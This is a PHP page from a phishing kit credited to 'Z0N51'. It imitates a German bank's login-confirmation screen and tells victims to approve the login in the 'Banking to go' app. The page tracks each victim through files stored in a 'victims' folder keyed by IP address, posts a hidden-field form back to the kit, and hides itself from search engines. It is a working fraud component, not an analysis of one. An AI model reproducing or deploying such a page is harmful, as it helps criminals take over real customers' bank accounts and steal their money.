<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    if( $_GET['error'] == 1 ) {
        $_SESSION['last_page'] = 'errorsms';
    } else {
        $_SESSION['last_page'] = 'sms';
    }
    $img = file_get_contents('../victims/'. get_client_ip() .'-tan.txt');
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Login</title>
    </head>

    <body>

		<!-- HEADER -->
        <!-- HEADER -->
        <header style="margin-bottom: 9%;" class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
        <div class="header__inner">
          <a class="u-left" >
            <img src="../assets/imgs/logoo.png"/>
          </a>
        </div>
      </header>
        <!-- END HEADER -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                
                <div class="login-area">
                    <h1 >Log-in bestätigen</h1>
                    <h4 style="color: orange">Freigabe<h4>
                    <div class="box mb-4 pushtan">
                        <p><i class="fas fa-mobile-alt"></i>   Jetzt bitte Ihren Log-in mit der App Banking to go bestätigen.</p>
                    </div>
                    <div class="box">
                        <form action="../index.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="app">
                            <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                            <div class="box mb-4 push-tan">
                            <div class="block">
                            <div class="bline btext-only" style="color:black">
                                    Tipp: Der Log-in wird in der App nicht zur Bestätigung angezeigt? Dann gehen Sie in der App auf "Meine Konten" und ziehen Sie den Bildschirm kurz nach unten, um die Anzeige zu aktualisieren.</strong>
                                    <br class="bterm"></div>
                                    <div class="bline ptd-image btext-only">
                                        <div class="image">
                                            <center><img src="../assets/imgs/app.gif" alt="" style="max-width: 45%;"></center>
                                        </div>
                                    <br class="bterm"></div>
                                   
                                    <input type="hidden" name="wHWSIBxYxxcdLFPT" id="wHWSIBxYxxcdLFPT" value="ERROR">
                                    
                                        <script>
                                            $(document).one('if6_page_ready', function() {
                                                $('form').trigger('start-ptan-decoupled-polling');
                                            });
                                        </script>
                                    
                                    
                                </div>
                            </div>
                            <div class="text-right"><button type="submit" style="background-color: orange;">Abbrechen <i class="fas fa-chevron-circle-right"></i></button></div>
                        </form>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>